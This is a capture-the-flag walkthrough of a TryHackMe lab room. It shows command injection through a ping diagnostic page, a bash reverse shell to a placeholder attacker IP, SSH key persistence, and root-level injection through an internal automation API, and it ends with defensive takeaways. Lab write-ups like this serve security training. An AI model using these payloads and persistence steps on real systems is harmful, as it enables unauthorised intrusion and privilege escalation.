## Walkthrough: TryHackMe Room: "Infinity Pool"

> **Room:** Infinity Pool (Byte Lotus Hotel)  
> **Platform:** TryHackMe  
> **Category:** Boot2Root  
> **Difficulty:** Medium  
> **Objective:** Obtain the **User** and **Root** flags by exploiting multiple command injection vulnerabilities and pivoting through internal services.

---

# Room Summary

This room demonstrates how a seemingly harmless diagnostic utility can lead to complete system compromise.

The attack chain consists of:

1. Web enumeration
    
2. Discovering an internal diagnostic page
    
3. Exploiting OS Command Injection
    
4. Gaining Remote Code Execution (RCE)
    
5. Obtaining a reverse shell
    
6. Reading the user flag
    
7. Establishing SSH persistence
    
8. Enumerating internal-only services
    
9. Pivoting to an internal FreePBX instance
    
10. Abusing an automation API running as root
    
11. Exploiting another command injection
    
12. Reading the root flag
    

---

# Enumeration

## Nmap

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

Result:

```
22/tcp open ssh
80/tcp open http
```

Interesting information:

```
http-server-header: gunicorn
http-title: Byte Lotus — Stay Noticed

robots.txt:
    /internal/
    /status
```

---

# robots.txt

Navigate to

```
http://TARGET/robots.txt
```

Contents

```
User-agent: *

Disallow: /internal/
Disallow: /status
```

Although `/internal/` returned **404**, `/status` was accessible.

---

# Staff Portal

Visiting

```
http://TARGET/status
```

revealed a staff tool called

```
Sister-property connectivity
```

It accepted a hostname and performed a connectivity test.

---

# Finding Command Injection

Testing

```
127.0.0.1
```

worked normally.

Adding

```
127.0.0.1;id
```

returned

```
uid=1001(web)
gid=1001(web)
```

This confirmed **OS Command Injection**.

The vulnerable code later confirmed why:

```python
subprocess.run(
    f"ping -c 1 {host}",
    shell=True,
    capture_output=True,
    text=True
)
```

Using

```python
shell=True
```

allowed arbitrary shell command execution.

---

# Initial Enumeration

Identify current user

```bash
127.0.0.1;whoami
```

Output

```
web
```

Hostname

```bash
127.0.0.1;hostname
```

```
tryhackme-2404
```

Current directory

```bash
127.0.0.1;pwd
```

```
/var/www/infinity_pool/edge
```

Directory contents

```bash
127.0.0.1;ls -la
```

```
app.py
templates/
static/
venv/
```

---

# Reading Source Code

Read the application

```bash
127.0.0.1;sed -n '1,200p' /var/www/infinity_pool/edge/app.py
```

The application clearly showed

```python
subprocess.run(
    f"ping -c 1 {host}",
    shell=True
)
```

confirming command injection.

---

# User Enumeration

Locate the user flag

```bash
find /home -name user.txt 2>/dev/null
```

Result

```
/home/web/user.txt
```

Read it

```bash
cat /home/web/user.txt
```

User Flag

```
THM{.................}
```

---

# Obtaining a Reverse Shell

Start a listener

```bash
nc -lvnp 4444
```

Trigger

```bash
127.0.0.1;/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Connection received

```
web@tryhackme-2404
```

Upgrade the shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Background

```
CTRL+Z
```

Fix terminal

```bash
stty raw -echo
fg
export TERM=xterm
stty rows 40 cols 120
```

---

# SSH Persistence

Generate keys

```bash
ssh-keygen -t rsa -b 2048 -f ctf_key
```

Convert public key

```bash
base64 -w0 ctf_key.pub
```

Create `.ssh`

```bash
mkdir -p /home/web/.ssh
```

Upload the key

```bash
echo BASE64_KEY | base64 -d > /home/web/.ssh/authorized_keys
```

Permissions

```bash
chmod 700 /home/web/.ssh
chmod 600 /home/web/.ssh/authorized_keys
```

SSH

```bash
ssh -i ctf_key web@TARGET
```

---

# Internal Enumeration

Health endpoint

```bash
curl http://127.0.0.1:3000/api/health
```

Output

```json
{
    "status":"ok"
}
```

Configuration endpoint

```bash
curl http://127.0.0.1:3000/api/config
```

Returned

```json
{
  "automation_endpoint":"http://127.0.0.1:9000",
  "telephony_user":"FreePBXUCPTemplateCreator",
  "telephony_pass":"St4yN0t1c3d_2026",
  "telephony_portal":"http://127.0.0.1:8080/ucp",
  "ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE."
}
```

This disclosed

- Internal Automation API
    
- FreePBX credentials
    
- Internal UCP portal
    

---

# SSH Port Forwarding

Create a tunnel

```bash
ssh -i ctf_key \
-N \
-L 8080:127.0.0.1:8080 \
web@TARGET
```

Visit

```
http://127.0.0.1:8080/ucp
```

Login

```
Username:
FreePBXUCPTemplateCreator

Password:
St4yN0t1c3d_2026
```

---

# Root Service Discovery

Health endpoint

```bash
curl http://127.0.0.1:9000/health
```

Output

```json
{
    "runs_as":"root"
}
```

Documentation also described

```
POST /jobs/export
```

requiring

```
Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a
```

---

# Testing Command Injection

Legitimate request

```bash
curl -X POST \
http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
-H "Content-Type: application/json" \
--data '{"report":"latest"}'
```

Testing injection

```json
{
    "report":"test;id;#"
}
```

Response

```
uid=0(root)
gid=0(root)
```

This confirmed another **OS Command Injection**, this time executing **as root**.

---

# Root Flag

Read

```bash
curl -s -X POST \
http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
-H "Content-Type: application/json" \
--data '{"report":"x;cat /root/root.txt;#"}'
```

Output

```
THM{...................}
```

---

---

# Vulnerabilities Identified

|Vulnerability|Severity|Description|
|---|---|---|
|Information Disclosure|Medium|`robots.txt` exposed hidden functionality.|
|OS Command Injection|Critical|`shell=True` with unsanitized input in `/status`.|
|Internal Information Disclosure|High|Watchtower API leaked internal services and credentials.|
|Default Credentials|Critical|FreePBX template account remained unchanged.|
|Internal API Exposure|High|Automation service reachable from localhost.|
|OS Command Injection|Critical|`report` parameter executed arbitrary commands as root.|
|Privilege Escalation|Critical|Root automation service executed attacker-controlled shell commands.|

---

# Attack Flow

```text
Nmap
      │
      ▼
robots.txt
      │
      ▼
/status
      │
      ▼
Command Injection
      │
      ▼
RCE as web
      │
      ▼
Reverse Shell
      │
      ▼
Read User Flag
      │
      ▼
SSH Persistence
      │
      ▼
Watchtower API
      │
      ▼
FreePBX Credentials
      │
      ▼
Port Forwarding
      │
      ▼
Internal UCP
      │
      ▼
Automation API
      │
      ▼
Root Command Injection
      │
      ▼
Read Root Flag
```

---

# Key Takeaways

- Never invoke shell commands using `shell=True` with untrusted input.
    
- Avoid exposing sensitive endpoints via `robots.txt`.
    
- Internal APIs should not disclose credentials or infrastructure details.
    
- Remove or rotate default credentials before deployment.
    
- Validate and sanitize user-controlled input before constructing shell commands.
    
- Services running as `root` should avoid shell execution entirely and follow the principle of least privilege.
